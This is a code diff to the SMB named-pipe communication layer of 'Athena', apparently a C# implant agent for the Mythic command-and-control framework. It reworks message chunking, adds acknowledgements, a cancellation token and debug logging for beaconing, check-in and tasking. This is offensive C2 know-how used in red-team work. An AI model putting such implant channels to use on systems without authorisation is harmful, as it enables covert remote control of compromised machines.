@@ -18,6 +18,8 @@ using System.Security.Principal;
 using System.Text;
 using System.Text.Json;
 using Athena.Models;
+using H.Pipes.Extensions;
+using Athena.Models.Comms.SMB;
 
 namespace Athena
 {
@@ -25,7 +27,7 @@ namespace Athena
     {
         public string uuid { get; set; }
         public string psk { get; set; }
-        public string pipeName = "pipename";
+        public string pipeName = "scottie_pipe";
         private string checkinResponse { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
@@ -33,13 +35,14 @@ namespace Athena
         private bool connected { get; set; }
         public bool encrypted { get; set; }
         public bool encryptedExchangeCheck = bool.Parse("false");
-        private PipeServer<DelegateMessage> serverPipe { get; set; }
+        private PipeServer<SmbMessage> serverPipe { get; set; }
         public PSKCrypto crypt { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
         private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
-        private CancellationTokenSource cts = new CancellationTokenSource();
-        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
         private ManualResetEvent onCheckinResponse = new ManualResetEvent(false);
+        private CancellationTokenSource cts = new CancellationTokenSource();
+        private CancellationToken cancellationToken { get; set; }
+        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
         private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
         private bool checkedin = false;
         public Smb()
@@ -49,6 +52,7 @@ namespace Athena
             uuid = "%UUID%";
             this.connected = false;
             this.psk = "AESPSK";
+            //this.psk = "";
             this.sleep = 0;
             this.jitter = 0; ;
 
@@ -57,7 +61,7 @@ namespace Athena
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
-            this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
+            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
             if (Environment.OSVersion.Platform == PlatformID.Win32NT)
             {
 #pragma warning disable CA1416
@@ -66,18 +70,18 @@ namespace Athena
                 this.serverPipe.SetPipeSecurity(pipeSec);
 #pragma warning restore CA1416
             }
-
+            this.cancellationToken = this.cts.Token;
             this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
             this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
-            this.serverPipe.StartAsync();
+            this.serverPipe.StartAsync(this.cancellationToken);
 
             Debug.WriteLine($"[{DateTime.Now}] Started SMB Server. Listening on {this.pipeName}");
         }
         public async Task StartBeacon()
         {
-
-            while (!cts.IsCancellationRequested)
+            Debug.WriteLine($"[{DateTime.Now}] Starting Beacon Loop.");
+            while (!cancellationToken.IsCancellationRequested)
             {
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
@@ -90,6 +94,9 @@ namespace Athena
 
                 if (responses.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0)
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Responses: " + responses.Count());
+                    Debug.WriteLine($"[{DateTime.Now}] Delegates: " + delegateMessages.Count());
+                    Debug.WriteLine($"[{DateTime.Now}] Socks Messages: " + socksMessages.Count());
                     GetTasking gt = new GetTasking()
                     {
                         action = "get_tasking",
@@ -119,7 +126,6 @@ namespace Athena
 
             //Check what kind of message we got.
             Dictionary<string, string> msg = Misc.ConvertJsonStringToDict(message);
-
             //Check if it's a checkin or not
             if (msg.ContainsKey("action") && msg["action"] == "checkin")
             {
@@ -140,6 +146,8 @@ namespace Athena
                 TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                 this.SetTaskingReceived(this, tra);
             }
+
+            //Should I send a message received response
         }
         public bool StopBeacon()
         {
@@ -149,72 +157,54 @@ namespace Athena
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             //Write our checkin message to the pipe
+            Debug.WriteLine($"[{DateTime.Now}] Starting Checkin Process");
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
             //Wait for our ManualResetEvent to trigger indicating we got a response.
+            //await this.serverPipe.WaitMessageAsync();
             onCheckinResponse.WaitOne();
-
             //We got a message, but we should make sure it's not empty.
             if (!string.IsNullOrEmpty(this.checkinResponse))
             {
                 string res = this.checkinResponse;
                 this.checkinResponse = String.Empty;
                 this.checkedin = true;
+                Debug.WriteLine($"[{DateTime.Now}] Finished Checkin Process");
                 return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
             }
-
+            Debug.WriteLine($"[{DateTime.Now}] Failed Checkin Process");
             return new CheckinResponse()
             {
                 status = "failed"
             };
         }
-        private async Task OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
+        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
         {
             //Event handler for new messages
+
+            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.delegate_message.Length} bytes");
             try
             {
-                Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.message.Length} bytes");
-                //Check if we already have a partial message
-                if (this.partialMessages.ContainsKey(args.Message.uuid))
+                if (args.Message.message_type == "success")
                 {
-                    //This message already exists in our dictionary, check to see if it's final.
-                    if (args.Message.final) //Final message received
-                    {
-                        Debug.WriteLine($"[{DateTime.Now}] Final message received.");
-                        string oldMsg = args.Message.message;
-
-                        //Append the final message to our object
-                        args.Message.message = this.partialMessages[args.Message.uuid].Append(oldMsg).ToString();
-
-                        //Signal to our subscribers that a message is available.
-                        this.OnMythicMessageReceived(args.Message.message);
-
-                        //Remove the partial message from our tracker since we're done with it.
-                        this.partialMessages.Remove(args.Message.uuid, out _);
-                    }
-                    else //Not Last Message but we already have a value in the partial messages
-                    {
-                        //Append our message to the current one
-                        this.partialMessages[args.Message.uuid].Append(args.Message.message);
-                    }
+                    return;
                 }
-                else //First time we've seen this message
+
+                this.partialMessages.TryAdd(args.Message.message_type, new StringBuilder()); //Either Add the key or it already exists
+
+                this.partialMessages[args.Message.message_type].Append(args.Message.delegate_message);
+
+                if (args.Message.final)
                 {
-                    if (args.Message.final) //Message was small enough for one write
-                    {
-                        this.OnMythicMessageReceived(args.Message.message);
-                        onEventHappenedSignal.Set(); //Indicate something happened
-                    }
-                    else //Message needs to be added to our tracker
-                    {
-                        Debug.WriteLine($"[{DateTime.Now}] New message received, adding to tracker.");
-                        this.partialMessages.GetOrAdd(args.Message.uuid, new StringBuilder(args.Message.message)); //Add value to our Collection
-                    }
+                    this.OnMythicMessageReceived(this.partialMessages[args.Message.message_type].ToString());
+                    this.partialMessages.Remove(args.Message.message_type, out _);
                 }
+
+                await this.SendSuccess();
             }
             catch (Exception e)
             {
-                Debug.WriteLine($"[{DateTime.Now}] {e}");
+                Debug.WriteLine($"[{DateTime.Now}] Error in SMB Forwarder: {e}");
             }
         }
         private async Task OnClientConnection()
@@ -224,6 +214,7 @@ namespace Athena
             this.connected = true;
             if (this.checkedin)
             {
+                Debug.WriteLine($"[{DateTime.Now}] We're already checked in so sending a get_tasking");
                 GetTasking gt = new GetTasking()
                 {
                     action = "get_tasking",
@@ -247,7 +238,10 @@ namespace Athena
         {
             if (!connected)
             {
+                Debug.WriteLine($"[{DateTime.Now}] Waiting for connection event...");
+
                 onClientConnectedSignal.WaitOne();
+                Debug.WriteLine($"[{DateTime.Now}] Connect Receieved");
             }
 
             try
@@ -261,28 +255,27 @@ namespace Athena
                     json = await Misc.Base64Encode(this.uuid + json);
                 }
 
-                DelegateMessage dm = new DelegateMessage()
+                SmbMessage sm = new SmbMessage()
                 {
-                    uuid = this.uuid,
-                    c2_profile = "smb",
-                    final = false
+                    final = false,
+                    message_type = "chunked_message"
                 };
 
                 IEnumerable<string> parts = json.SplitByLength(4000);
 
-                //hunk the message and send the parts
                 Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {json.Length} in {parts.Count()} chunks.");
                 foreach (string part in parts)
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes.");
-                    dm.message = part;
+                    sm.delegate_message = part;
 
                     if (part == parts.Last())
                     {
-                        dm.final = true;
+                        sm.final = true;
                     }
-                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {dm.final}");
-                    await this.serverPipe.WriteAsync(dm);
+                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
+
+                    await this.serverPipe.WriteAsync(sm);
+
                 }
 
                 Debug.WriteLine($"[{DateTime.Now}] Done writing message to pipe.");
@@ -295,12 +288,18 @@ namespace Athena
 
             return String.Empty;
         }
-    }
-    class SmbMessage
-    {
-        public string uuid;
-        public string message;
-        public int chunks;
-        public int chunk;
+
+        private async Task SendSuccess()
+        {
+            //Indicate the server that we're done processing the message and it can send the next one (if it's there)
+            SmbMessage sm = new SmbMessage()
+            {
+                message_type = "success",
+                final = true,
+                delegate_message = String.Empty
+            };
+
+            await this.serverPipe.WriteAsync(sm);
+        }
     }
 }
